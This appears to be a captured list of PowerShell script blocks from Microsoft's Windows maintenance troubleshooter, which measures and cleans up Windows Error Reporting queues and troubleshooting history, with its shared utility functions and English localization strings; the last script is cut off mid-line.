null
null
null
null
null
null
null
null
null
null
null
null
"Write-Host 'Final result: 1';"
"$Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;"
"$global:?"
"$global:?"
null
"& \"C:\\Windows\\TEMP\\SDIAG_2c20262b-ddaf-4048-aa81-d9776dce793f\\TS_WERQueue.ps1\""
null
"& \"C:\\Windows\\TEMP\\SDIAG_e44eb657-bb0e-4ab0-8521-35e3ca3f528e\\TS_WERQueue.ps1\""
"# Copyright © 2008, Microsoft Corporation. All rights reserved.\r\n\r\ntrap {break}\r\n\r\n# Include common library\r\n. .\\CL_Utility.ps1\r\n\r\nImport-LocalizedData -BindingVariable localizationString -FileName CL_LocalizationData\r\n\r\n# Troubleshooting WER queue\r\nWrite-DiagProgress -Activity $localizationString.CheckWERQueue\r\n\r\n[double]$freeSpace = Get-FreeSpace\r\n[double]$percentage = Get-Percentage\r\n[string]$userReportPath = Get-UserReportPath\r\n[string]$machineReportPath = Get-MachineReportPath\r\n\r\n[double]$userReportSize = Get-FolderSize $userReportPath\r\n[double]$machineReportSize = Get-FolderSize $machineReportPath\r\n[double]$totalSize = Format-DiskSpaceMB ($userReportSize + $machineReportSize)\r\n\r\n# Reporting\r\n$systemDrive = Get-SystemDriveInfo\r\nif($systemDrive -ne $null) {\r\n    $systemDrive | Select-Object -Property @{Name=$localizationString.driveName;Expression={$_.DeviceID}},@{Name=$localizationString.FreeSpace;Expression={(Format-DiskSpaceGB $_.FreeSpace) + \"GB\"}},@{Name=$localizationString.totalSpace;Expression={(Format-DiskSpaceGB $_.Size) + \"GB\"}} | ConvertTo-Xml | Update-DiagReport -id SystemDriveInfo -Name $localizationString.systemDriveInfo_name -Description $localizationString.systemDriveInfo_description -rid \"RC_WERQueue\"\r\n}\r\n\r\n@{Name=$userReportPath;Space=$userReportSize} | Select-Object -Property @{Name=$localizationString.userReportPath;Expression={$_.Name}},@{Name=$localizationString.userReportSpace;Expression={(Format-DiskSpaceMB $_.Space) + \"MB\"}} | ConvertTo-Xml | Update-DiagReport -id UserReprotInfo -Name $localizationString.UserReportInfo_name -Description $localizationString.UserReportInfo_description -rid \"RC_WERQueue\"\r\n\r\n@{Name=$machineReportPath;Space=$machineReportSize} | Select-Object -Property @{Name=$localizationString.MachineReportPath;Expression={$_.Name}},@{Name=$localizationString.MachineReportSpace;Expression={(Format-DiskSpaceMB $_.Space) + \"MB\"}} | ConvertTo-Xml | Update-DiagReport -id AdminReprotInfo -Name $localizationString.MachineReportInfo_name -Description $localizationString.MachineReportInfo_description -rid \"RC_WERQueue\"\r\n\r\nif((($freeSpace + $userReportSize) -gt 0) -and ($percentage -ge 0)) {\r\n    if(($userReportSize / ($freeSpace + $userReportSize)) * 100 -gt $percentage) {\r\n        Update-Diagrootcause -ID \"RC_WERQueue\" -Detected $true -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n        return\r\n    }\r\n}\r\n\r\nif((($freeSpace + $machineReportSize) -gt 0) -and ($percentage -ge 0)) {\r\n    if(($machineReportSize / ($freeSpace + $machineReportSize) * 100 -gt $percentage)) {\r\n        Update-DiagRootcause -ID \"RC_WERQueue\" -Detected $true -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n        return\r\n    }\r\n}\r\n\r\nUpdate-DiagRootcause -ID \"RC_WERQueue\" -Detected $false -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n"
"# Copyright © 2008, Microsoft Corporation. All rights reserved.\r\n\r\n\r\n#Common utility functions\r\nImport-LocalizedData -BindingVariable localizationString -FileName CL_LocalizationData\r\n\r\n# Function to get user troubleshooting history\r\nfunction Get-UserTSHistoryPath {\r\n    return \"${env:localappdata}\\diagnostics\"\r\n}\r\n\r\n# Function to get admin troubleshooting history\r\nfunction Get-AdminTSHistoryPath {\r\n    return \"${env:localappdata}\\elevateddiagnostics\"\r\n}\r\n\r\n# Function to get user report folder path\r\nfunction Get-UserReportPath {\r\n    return \"${env:localappdata}\\Microsoft\\Windows\\WER\\ReportQueue\"\r\n}\r\n\r\n# Function to get system report folder path\r\nfunction Get-MachineReportPath {\r\n    return \"${env:AllUsersProfile}\\Microsoft\\Windows\\WER\\ReportQueue\"\r\n}\r\n\r\n# Function to get threshold to check whether a folder is old\r\nfunction Get-ThresholdForCheckOlderFile {\r\n    [int]$threshold = -1\r\n    return $threshold\r\n}\r\n\r\n# Function to get threshold for deleting WER folder\r\nfunction Get-ThresholdForFileDeleting() {\r\n    [string]$registryEntryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\"\r\n    [string]$registryEntryName = \"PurgeThreshholdValueInKB\"\r\n    [double]$defaultValue = 10.0\r\n\r\n    return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue\r\n}\r\n\r\n# Function to get the size of a directory in kb\r\nfunction Get-FolderSize([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return 0\r\n    }\r\n\r\n    if(-not $Global:DirectoryObject) {\r\n        $Global:DirectoryObject = New-Object -comobject \"Scripting.FileSystemObject\"\r\n    }\r\n\r\n    return ($Global:DirectoryObject.GetFolder($folder).Size) / 1kb\r\n}\r\n\r\n# Function to delete a folder\r\nfunction Delete-Folder([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return\r\n    }\r\n\r\n    Remove-Item -literalPath $folder -Recurse -Force\r\n}\r\n\r\n# Function to delete old folders\r\nfunction Delete-OldFolders($folder=$(throw \"No folder is specified\")) {\r\n    if(($folder -eq $null) -or (-not(Test-Path $folder))) {\r\n        return\r\n    }\r\n\r\n    [int]$threshold = Get-ThresholdForCheckOlderFile\r\n    $folders = Get-ChildItem -LiteralPath ($folder.FullName) -Force | Where-Object {$_.PSIsContainer}\r\n    if($folders -ne $null) {\r\n        foreach($folder in $folders) {\r\n            if((($folder.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0) {\r\n                Delete-Folder ($folder.FullName)\r\n            } else {\r\n                Delete-OldFolders (Get-Item ($folder.FullName))\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n# Function to get registry value\r\nfunction Get-RegistryValue([string]$registryEntryPath = $(throw \"No registry entry path is specified\"), [string]$registryEntryName = $(throw \"No registry entry name is specified\"), [double]$defaultValue = 0.0) {\r\n    [double]$registryEntryValue = $defaultValue\r\n\r\n    $registryEntry = Get-ItemProperty -Path $registryEntryPath -Name $registryEntryName\r\n    if($registryEntry -ne $null) {\r\n        $registryEntryValue = $registryEntry.$registryEntryName\r\n    }\r\n\r\n\treturn $registryEntryValue\r\n}\r\n\r\n# Function to get the percentage that WER queue can take up\r\nfunction Get-Percentage() {\r\n    [string]$registryEntryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\"\r\n    [string]$registryEntryName = \"MaxQueueSizePercentage\"\r\n    [double]$defaultValue = 100.0\r\n\r\n    return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue\r\n}\r\n\r\n# Function to get free disk space on machine\r\nfunction Get-FreeSpace {\r\n    [double]$freeSpace = 0.0\r\n    [string]$wql = \"SELECT * FROM Win32_LogicalDisk WHERE MediaType=12\"\r\n    $drives = Get-WmiObject -query $wql\r\n    if($null -ne $drives) {\r\n        foreach($drive in $drives) {\r\n            $freeSpace += ($drive.freeSpace)\r\n        }\r\n    }\r\n\r\n    return ($freeSpace / 1KB)\r\n}\r\n\r\n# Function to get all unnecessary files\r\nfunction Get-UnnecessaryFiles([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return $null\r\n    }\r\n\r\n    [int]$threshold = Get-ThresholdForCheckOlderFile\r\n\r\n    return (Get-ChildItem -literalPath $folder -Recurse -Force | Where-Object {($_.PSIsContainer) -and ((($_.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0)})\r\n}\r\n\r\n# Function to format disk space (KB -> MB)\r\nfunction Format-DiskSpaceMB([double]$space = $(throw \"No space is specified\")) {\r\n    return [string]([Math]::Round(($space / 1KB), 3))\r\n}\r\n\r\n# Function to format disk space (B -> GB)\r\nFunction Format-DiskSpaceGB([double]$space = $(throw \"No space is specified\")) {\r\n    return [string]([Math]::Round(($space / 1GB), 3))\r\n}\r\n\r\n# Function to attach item to the list with delimiter \"/\"\r\nfunction AttachTo-List([string]$list = $(throw \"No list is specified\"), [string]$item = $(throw \"No item is specified\"))\r\n{\r\n    if([String]::IsNullOrEmpty($list))\r\n    {\r\n        return $item\r\n    }\r\n\r\n    if([String]::IsNullOrEmpty($item))\r\n    {\r\n        return $list\r\n    }\r\n\r\n    return $list + \"/\" + $item\r\n}\r\n\r\n# Function to parse the the list with delimiter \"/\"\r\nfunction Parse-List([string]$list = $(throw \"No list is specified\"))\r\n{\r\n    if($list -eq $null)\r\n    {\r\n        return $null\r\n    }\r\n\r\n    return $list.Split(\"/\", [StringSplitOptions]::RemoveEmptyEntries)\r\n}\r\n\r\n# Function to get list length\r\nfunction Get-ListLength([string]$list = $(throw \"No list is specified\"))\r\n{\r\n    if($list -eq $null)\r\n    {\r\n        return 0\r\n    }\r\n\r\n    $result = Parse-List $list\r\n\r\n    if($result -is [string])\r\n    {\r\n        return 1\r\n    }\r\n    elseif($result -is [object[]])\r\n    {\r\n        return $result.count\r\n    }\r\n    else\r\n    {\r\n        return 0\r\n    }\r\n}\r\n\r\n# Function to convert to WQL path\r\nfunction ConvertTo-WQLPath([string]$wqlPath = $(throw \"No WQL path is specified\"))\r\n{\r\n    if($wqlPath -eq $null)\r\n    {\r\n        return \"\"\r\n    }\r\n\r\n    return $wqlPath.Replace(\"\\\", \"\\\\\")\r\n}\r\n\r\n# Function to check whether the shortcut is valid\r\nfunction Test-ValidLink([Wmi]$wmiLinkFile = $(throw \"No WMI link file is specified\"))\r\n{\r\n    if(($wmiLinkFile -eq $null) -or ([String]::IsNullOrEmpty($wmiLinkFile.Target)))\r\n    {\r\n        return $false\r\n    }\r\n\r\n    return Test-Path $wmiLinkFile.Target\r\n}\r\n\r\n# Function to chech whether have permission to delete the shortcut file\r\nfunction Test-Delete([Wmi]$wmiLinkFile = $(throw \"No WMI link file is specified\"))\r\n{\r\n    if($wmiLinkFile -eq $null)\r\n    {\r\n        return $false\r\n    }\r\n\r\n    return ($wmiLinkFile.AccessMask -band 0x10000) -eq 0x10000\r\n}\r\n\r\n# Function to get desktop path\r\nfunction Get-DesktopPath()\r\n{\r\n$methodDefinition = @\"\r\n    public static string GetDesktopPath\r\n    {\r\n        get\r\n        {\r\n            return Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);\r\n        }\r\n    }\r\n\"@\r\n\r\n    $type = Add-Type -MemberDefinition $methodDefinition -Name \"DesktopPath\" -PassThru\r\n\r\n    return $type::GetDesktopPath\r\n}\r\n\r\n# Function to get startup path\r\nfunction Get-StartupPath()\r\n{\r\n$methodDefinition = @\"\r\n    public static string GetStartupPath\r\n    {\r\n        get\r\n        {\r\n            return Environment.GetFolderPath(Environment.SpecialFolder.Startup);\r\n        }\r\n    }\r\n\"@\r\n\r\n    $type = Add-Type -MemberDefinition $methodDefinition -Name \"StartupPath\" -PassThru\r\n\r\n    return $type::GetStartupPath\r\n}\r\n\r\n# Function to remove all files in the list\r\nfunction Remove-FileList([string]$list = $(throw \"No list is specified\"))\r\n{\r\n    if([String]::IsNullOrEmpty($list))\r\n    {\r\n        return\r\n    }\r\n\r\n    try\r\n    {\r\n        Parse-List $list | Foreach-Object {\r\n            if(-not([String]::IsNullOrEmpty($_)))\r\n            {\r\n                Remove-Item $_ -Force\r\n            }\r\n        }\r\n    }\r\n    catch\r\n    {\r\n        $_ | ConvertTo-Xml | Update-DiagReport -id DeleteFileExceptions -Name $localizationString.filesFailToRemove_name -Description $localizationString.filesFailToRemove_description -Verbosity Warning\r\n    }\r\n}\r\n\r\n# Function to get the last access time of an Icon\r\nfunction Get-LastAccessTime([string]$filePath = $(throw \"No file path is specified\"))\r\n{\r\n    if([String]::IsNullOrEmpty($filePath) -or -not(Test-Path $filePath))\r\n    {\r\n        throw \"No file path found\"\r\n    }\r\n\r\n$typeDefinition = @\"\r\n\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.Runtime.InteropServices;\r\nusing ComType = System.Runtime.InteropServices.ComTypes;\r\n\r\npublic sealed class FileInfo\r\n{\r\n    private FileInfo()\r\n    {\r\n    }\r\n\r\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\r\n    struct UAINFO\r\n    {\r\n        internal int cbSize;\r\n        internal int dwMask;\r\n        internal float R;\r\n        internal uint cLaunches;\r\n        internal uint cSwitches;\r\n        internal int dwTime;\r\n        internal ComType.FILETIME ftExecute;\r\n        [MarshalAs(UnmanagedType.Bool)] internal bool fExcludeFromMFU;\r\n\r\n        internal UAINFO(int dwMask)\r\n        {\r\n            this.cbSize = Marshal.SizeOf(typeof(UAINFO));\r\n            this.dwMask = dwMask;\r\n            this.R = 0;\r\n            this.cLaunches = 0;\r\n            this.cSwitches = 0;\r\n            this.dwTime = 0;\r\n            this.ftExecute = new ComType.FILETIME();\r\n            this.fExcludeFromMFU = false;\r\n        }\r\n    }\r\n\r\n    internal const int UAIM_FILETIME = 1;\r\n    internal static Guid UAIID_SHORTCUTS = new Guid(\"F4E57C4B-2036-45F0-A9AB-443BCFE33D9F\");\r\n\r\n    [ComImport, Guid(\"90D75131-43A6-4664-9AF8-DCCEB85A7462\"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]\r\n    interface IShellUserAssist\r\n    {\r\n        int FireEvent(ref Guid pguidGrp, int eCmd, string pszPath, int dwTimeElapsed);\r\n        int QueryEntry(ref Guid pguidGrp, string pszPath, ref UAINFO pui);\r\n        int SetEntry(ref Guid pguidGrp, string pszPath, ref UAINFO pui);\r\n        int RenameEntry(ref Guid pguidGrp, string pszFrom, string pszTo);\r\n        int DeleteEntry(ref Guid pguidGrp, string pszPath);\r\n        int Enable(bool fEnable);\r\n    }\r\n\r\n    [ComImport, Guid(\"DD313E04-FEFF-11d1-8ECD-0000F87A470C\")]\r\n    internal class UserAssist { }\r\n\r\n    public static DateTime GetLastAccessTime(string filePath)\r\n    {\r\n        if(String.IsNullOrEmpty(filePath))\r\n        {\r\n            throw new ArgumentException(\"The file path is null or empty\");\r\n        }\r\n\r\n        UAINFO uaInfo = new UAINFO(UAIM_FILETIME);\r\n        IShellUserAssist iShellUserAssist = new UserAssist() as IShellUserAssist;\r\n        if (iShellUserAssist == null)\r\n        {\r\n            throw new InvalidOperationException(\"Can't get iShellUserAssist interface\");\r\n        }\r\n\r\n        try\r\n        {\r\n            Marshal.ThrowExceptionForHR(iShellUserAssist.QueryEntry(ref UAIID_SHORTCUTS, filePath, ref uaInfo));\r\n        }\r\n        catch\r\n        {\r\n            throw new InvalidOperationException(\"Can't query info about\" + filePath);\r\n        }\r\n\r\n        long fileTime = (((long)uaInfo.ftExecute.dwHighDateTime) << 32) + uaInfo.ftExecute.dwLowDateTime;\r\n\r\n        return DateTime.FromFileTime(fileTime);\r\n    }\r\n}\r\n\"@\r\n\r\n    $type = Add-Type -TypeDefinition $typeDefinition -PassThru\r\n\r\n    return $type[0]::GetLastAccessTime($filePath)\r\n}\r\n\r\n# Function to check whether the icon is pointing to a file\r\nfunction Test-FileShortcut([Wmi]$wmiLinkFile = $(throw \"No wmi link file is specified\"))\r\n{\r\n    if($wmiLinkFile -eq $null)\r\n    {\r\n        return $false\r\n    }\r\n\r\n    [string]$target = $wmiLinkFile.Target\r\n    if([String]::IsNullOrEmpty($target) -or -not(Test-Path $target))\r\n    {\r\n        return $false\r\n    }\r\n\r\n    return -not((Get-Item $target).PSIsContainer)\r\n}\r\n\r\n# Function to create a choice in interaction page\r\nfunction Get-Choice([string]$name = $(throw \"No choice name is specified\"), [string]$description = $(throw \"No choice description is specified\"),\r\n                   [string]$value = $(throw \"No choice value is specified\"), [xml]$extension)\r\n{\r\n    return @{\"Name\"=$name;\"Description\"=$description;\"Value\"=$value;\"ExtensionPoint\"=$extension.InnerXml}\r\n}\r\n\r\n# Function to check whether the current machine is domain joined\r\nFunction Test-DomainJoined()\r\n{\r\n    return (Get-WmiObject -query \"select * from win32_ntdomain where Status ='OK'\") -ne $null\r\n}\r\n\r\n# Function to update time source\r\nFunction Update-TimeSource([string]$timeSource = $(throw \"No time source is specified\"))\r\n{\r\n    w32tm.exe /config /update /manualpeerlist:\"$timeSource\"\r\n}\r\n\r\n# Function to get system drive info\r\nfunction Get-SystemDriveInfo() {\r\n    [string]$wql = \"SELECT * FROM Win32_LogicalDisk WHERE MediaType=12 AND Name = '\" + ${env:systemdrive} + \"'\"\r\n    return Get-WmiObject -query $wql\r\n}\r\n\r\n# Function to get time service status\r\nfunction Get-ServiceStatus([string]$serviceName=$(throw \"No service name is specified\")) {\r\n   [bool]$startService = $true\r\n\r\n   [WMI]$timeService = @(Get-WmiObject -Query \"Select * From Win32_Service Where Name = `\"$serviceName`\"\")[0]\r\n   if($null -ne $timeService) {\r\n      [ServiceProcess.ServiceControllerStatus]$timeServicesStatus = (Get-Service $serviceName).Status\r\n      if(([ServiceProcess.ServiceControllerStatus]::Stopped -eq $timeServicesStatus) -or ([ServiceProcess.ServiceControllerStatus]::StopPending -eq $timeServicesStatus)) {\r\n         $startService = $false\r\n      }\r\n   }\r\n\r\n   return $startService\r\n}\r\n\r\n# Function to wait for expected service status\r\nfunction WaitFor-ServiceStatus([string]$serviceName=$(throw \"No service name is specified\"), [ServiceProcess.ServiceControllerStatus]$serviceStatus=$(throw \"No service status is specified\")) {\r\n    [ServiceProcess.ServiceController]$sc = New-Object \"ServiceProcess.ServiceController\" $serviceName\r\n    [TimeSpan]$timeOut = New-Object TimeSpan(0,0,0,5,0)\r\n    $sc.WaitForStatus($serviceStatus, $timeOut)\r\n}"
"# Localized\t12/07/2019 05:47 AM (GMT)\t303:6.40.20520 \tCL_LocalizationData.psd1\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nfilesFailToRemove_description=Exceptions caught while removing files.\r\ncheckBrokenDesktopShortcuts_progress=Checking for broken shortcuts...\r\ncheckBrokenStartupShortcuts_progress=Checking for broken startup links...\r\nbrokenDesktopShortcuts_name=Broken desktop shortcuts\r\nbrokenDesktopShortcuts_description=List of desktop shortcuts for which the target executable no longer exists.\r\nbrokenStartupShortcuts_name=Broken startup shortcuts\r\nbrokenStartupShortcuts_description=List of startup shortcuts for which the target executable no longer exists.\r\ndeleteBrokenDesktopShortcuts_progress=Deleting broken shortcuts...\r\ndeleteBrokenStartupShortcuts_progress=Deleting broken startup links...\r\ncheckSystemTime_progress=Checking clock time...\r\nsyncSystemTime_progress=Synchronizing clock time...\r\ntimeDelayAgainstTimeServer_name=Clock synchronization\r\ncheckUnusedDesktopIcons_progress=Checking for unused desktop icons...\r\nunusedDesktopShortcuts_name=Unused desktop shortcuts\r\nunusedDesktopShortcuts_description=List of shortcuts that have not been recently accessed for\r\nunusedTimeUnit=months.\r\ndeleteUnusedDesktopShortcuts_progress=Deleting unused shortcuts...\r\ntimeServerName=Time server name\r\nsamplesCollected=Samples collected\r\nserverTime=Server time\r\nlocalTime=Local time\r\ntimeDifference=Time difference\r\nshortcutName=Shortcut name\r\nCheckWERQueue=Checking for unnecessary files...\r\nDeleteUserWERQueue=Deleting Windows error reports...\r\nDeleteSystemWERQueue=Deleting Windows error reports...\r\nCheckTSHistory=Checking for unnecessary files...\r\nDeleteUserTSHistory=Deleting troubleshooting history...\r\nDeleteAdminTSHistory=Deleting troubleshooting history...\r\nfreeSpace=Free space\r\ntotalSpace=Total space\r\ndriveName=Drive name\r\nsystemDriveInfo_name=Disk information\r\nsystemDriveInfo_description=Details of the system drive.\r\nUserReportInfo_name=User Report details\r\nUserReportInfo_description=Details of the Windows error reporting user queue.\r\nuserReportPath=Folder name\r\nuserReportSpace=Disk space\r\nMachineReportInfo_name=System report details\r\nMachineReportInfo_description=Details of the Windows error reporting system queue.\r\nMachineReportPath=Folder name\r\nMachineReportSpace=Disk space\r\nreclaimedUserReportSize=Reclaimed space\r\nReclaimedUserReportInfo_name=Deleted user reports\r\nReclaimedUserReportInfo_description=Details of the updated Windows error reporting user queue.\r\nreclaimedMachineReportSize=Reclaimed space\r\nReclaimedMachineReportInfo_name=Deleted system reports\r\nReclaimedMachineReportInfo_description=Details of the updated Windows error reporting system queue.\r\nuserTSHistoryPath=Folder name\r\nadminTSHistoryPath=Folder name\r\nUserTSHistoryInfo_name=User troubleshooting history details\r\nUserTSHistoryInfo_description=Details of the user troubleshooting history logs.\r\nAdminTSHistoryInfo_name=Administrator troubleshooting history details\r\nAdminTSHistoryInfo_description=Details of the administrator troubleshooting history logs.\r\nReclaimedUserTSHistroyInfo_name=Deleted user troubleshooting history\r\nReclaimedUserTSHistroyInfo_description=Details of the updated user troubleshooting history folder.\r\nReclaimedAdminTSHistroyInfo_name=Deleted administrator troubleshooting history\r\nReclaimedAdminTSHistroyInfo_description=Details of the updated administrator troubleshooting history folder.\r\nuserTSHistorySize=Disk space\r\nadminTSHistorySize=Disk space\r\n###PSLOC\r\n'@\r\n"
"# Localized\t12/07/2019 05:47 AM (GMT)\t303:6.40.20520 \tCL_LocalizationData.psd1\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nfilesFailToRemove_description=Exceptions caught while removing files.\r\ncheckBrokenDesktopShortcuts_progress=Checking for broken shortcuts...\r\ncheckBrokenStartupShortcuts_progress=Checking for broken startup links...\r\nbrokenDesktopShortcuts_name=Broken desktop shortcuts\r\nbrokenDesktopShortcuts_description=List of desktop shortcuts for which the target executable no longer exists.\r\nbrokenStartupShortcuts_name=Broken startup shortcuts\r\nbrokenStartupShortcuts_description=List of startup shortcuts for which the target executable no longer exists.\r\ndeleteBrokenDesktopShortcuts_progress=Deleting broken shortcuts...\r\ndeleteBrokenStartupShortcuts_progress=Deleting broken startup links...\r\ncheckSystemTime_progress=Checking clock time...\r\nsyncSystemTime_progress=Synchronizing clock time...\r\ntimeDelayAgainstTimeServer_name=Clock synchronization\r\ncheckUnusedDesktopIcons_progress=Checking for unused desktop icons...\r\nunusedDesktopShortcuts_name=Unused desktop shortcuts\r\nunusedDesktopShortcuts_description=List of shortcuts that have not been recently accessed for\r\nunusedTimeUnit=months.\r\ndeleteUnusedDesktopShortcuts_progress=Deleting unused shortcuts...\r\ntimeServerName=Time server name\r\nsamplesCollected=Samples collected\r\nserverTime=Server time\r\nlocalTime=Local time\r\ntimeDifference=Time difference\r\nshortcutName=Shortcut name\r\nCheckWERQueue=Checking for unnecessary files...\r\nDeleteUserWERQueue=Deleting Windows error reports...\r\nDeleteSystemWERQueue=Deleting Windows error reports...\r\nCheckTSHistory=Checking for unnecessary files...\r\nDeleteUserTSHistory=Deleting troubleshooting history...\r\nDeleteAdminTSHistory=Deleting troubleshooting history...\r\nfreeSpace=Free space\r\ntotalSpace=Total space\r\ndriveName=Drive name\r\nsystemDriveInfo_name=Disk information\r\nsystemDriveInfo_description=Details of the system drive.\r\nUserReportInfo_name=User Report details\r\nUserReportInfo_description=Details of the Windows error reporting user queue.\r\nuserReportPath=Folder name\r\nuserReportSpace=Disk space\r\nMachineReportInfo_name=System report details\r\nMachineReportInfo_description=Details of the Windows error reporting system queue.\r\nMachineReportPath=Folder name\r\nMachineReportSpace=Disk space\r\nreclaimedUserReportSize=Reclaimed space\r\nReclaimedUserReportInfo_name=Deleted user reports\r\nReclaimedUserReportInfo_description=Details of the updated Windows error reporting user queue.\r\nreclaimedMachineReportSize=Reclaimed space\r\nReclaimedMachineReportInfo_name=Deleted system reports\r\nReclaimedMachineReportInfo_description=Details of the updated Windows error reporting system queue.\r\nuserTSHistoryPath=Folder name\r\nadminTSHistoryPath=Folder name\r\nUserTSHistoryInfo_name=User troubleshooting history details\r\nUserTSHistoryInfo_description=Details of the user troubleshooting history logs.\r\nAdminTSHistoryInfo_name=Administrator troubleshooting history details\r\nAdminTSHistoryInfo_description=Details of the administrator troubleshooting history logs.\r\nReclaimedUserTSHistroyInfo_name=Deleted user troubleshooting history\r\nReclaimedUserTSHistroyInfo_description=Details of the updated user troubleshooting history folder.\r\nReclaimedAdminTSHistroyInfo_name=Deleted administrator troubleshooting history\r\nReclaimedAdminTSHistroyInfo_description=Details of the updated administrator troubleshooting history folder.\r\nuserTSHistorySize=Disk space\r\nadminTSHistorySize=Disk space\r\n###PSLOC\r\n'@\r\n"
"function Get-FreeSpace {\r\n    [double]$freeSpace = 0.0\r\n    [string]$wql = \"SELECT * FROM Win32_LogicalDisk WHERE MediaType=12\"\r\n    $drives = Get-WmiObject -query $wql\r\n    if($null -ne $drives) {\r\n        foreach($drive in $drives) {\r\n            $freeSpace += ($drive.freeSpace)\r\n        }\r\n    }\r\n\r\n    return ($freeSpace / 1KB)\r\n}"
"function Get-Percentage() {\r\n    [string]$registryEntryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\"\r\n    [string]$registryEntryName = \"MaxQueueSizePercentage\"\r\n    [double]$defaultValue = 100.0\r\n\r\n    return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue\r\n}"
"function Get-RegistryValue([string]$registryEntryPath = $(throw \"No registry entry path is specified\"), [string]$registryEntryName = $(throw \"No registry entry name is specified\"), [double]$defaultValue = 0.0) {\r\n    [double]$registryEntryValue = $defaultValue\r\n\r\n    $registryEntry = Get-ItemProperty -Path $registryEntryPath -Name $registryEntryName\r\n    if($registryEntry -ne $null) {\r\n        $registryEntryValue = $registryEntry.$registryEntryName\r\n    }\r\n\r\n\treturn $registryEntryValue\r\n}"
"function Get-UserReportPath {\r\n    return \"${env:localappdata}\\Microsoft\\Windows\\WER\\ReportQueue\"\r\n}"
"function Get-MachineReportPath {\r\n    return \"${env:AllUsersProfile}\\Microsoft\\Windows\\WER\\ReportQueue\"\r\n}"
"function Get-FolderSize([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return 0\r\n    }\r\n\r\n    if(-not $Global:DirectoryObject) {\r\n        $Global:DirectoryObject = New-Object -comobject \"Scripting.FileSystemObject\"\r\n    }\r\n\r\n    return ($Global:DirectoryObject.GetFolder($folder).Size) / 1kb\r\n}"
"function Format-DiskSpaceMB([double]$space = $(throw \"No space is specified\")) {\r\n    return [string]([Math]::Round(($space / 1KB), 3))\r\n}"
"function Get-SystemDriveInfo() {\r\n    [string]$wql = \"SELECT * FROM Win32_LogicalDisk WHERE MediaType=12 AND Name = '\" + ${env:systemdrive} + \"'\"\r\n    return Get-WmiObject -query $wql\r\n}"
"{$_.DeviceID}"
"{(Format-DiskSpaceGB $_.FreeSpace) + \"GB\"}"
"Function Format-DiskSpaceGB([double]$space = $(throw \"No space is specified\")) {\r\n    return [string]([Math]::Round(($space / 1GB), 3))\r\n}"
"{(Format-DiskSpaceGB $_.Size) + \"GB\"}"
"{$_.Name}"
"{(Format-DiskSpaceMB $_.Space) + \"MB\"}"
"{$_.Name}"
"{(Format-DiskSpaceMB $_.Space) + \"MB\"}"
"& \"C:\\Windows\\TEMP\\SDIAG_e44eb657-bb0e-4ab0-8521-35e3ca3f528e\\TS_DiagnosticHistory.ps1\""
"# Copyright © 2008, Microsoft Corporation. All rights reserved.\r\n\r\ntrap {break}\r\n\r\n# Include common library\r\n. .\\CL_Utility.ps1\r\n\r\nImport-LocalizedData -BindingVariable localizationString -FileName CL_LocalizationData\r\n\r\n# function library\r\n# Function to check whether have unnecessary files\r\nfunction Test-UnnecessaryFiles([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return $false\r\n    }\r\n\r\n    [int]$threshold = -1\r\n    $folders = Get-ChildItem -literalPath $folder -Recurse -Force | Where-Object {($_.PSIsContainer) -and ((($_.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0)}\r\n\r\n    return ($folders -ne $null)\r\n}\r\n\r\n# Check troubleshooting history\r\nWrite-DiagProgress -Activity $localizationString.CheckTSHistory\r\n\r\n[string]$userTSHistoryPath = Get-UserTSHistoryPath\r\n[string]$adminTSHistoryPath = Get-AdminTSHistoryPath\r\n[double]$userTSHistorySize = (Get-FolderSize $userTSHistoryPath)\r\n[double]$adminTSHistorySize = (Get-FolderSize $adminTSHistoryPath)\r\n[double]$totalSize = Format-DiskSpaceMB ($userTSHistorySize + $adminTSHistorySize)\r\n\r\n# Reporting\r\n@{Name=$userTSHistoryPath;Space=$userTSHistorySize} | Select-Object -Property @{Name=$localizationString.userTSHistoryPath;Expression={$_.Name}},@{Name=$localizationString.userTSHistorySize;Expression={(Format-DiskSpaceMB $_.Space) + \"MB\"}} | ConvertTo-Xml | Update-DiagReport -id UserTSHistorySizeInfo -Name $localizationString.UserTSHistoryInfo_name -Description $localizationString.UserTSHistoryInfo_description -rid \"RC_DiagnosticHistory\"\r\n\r\n@{Name=$adminTSHistoryPath;Space=$adminTSHistorySize} | Select-Object -Property @{Name=$localizationString.adminTSHistoryPath;Expression={$_.Name}},@{Name=$localizationString.adminTSHistorySize;Expression={(Format-DiskSpaceMB $_.Space) + \"MB\"}} | ConvertTo-Xml | Update-DiagReport -id AdminTSHistorySizeInfo -Name 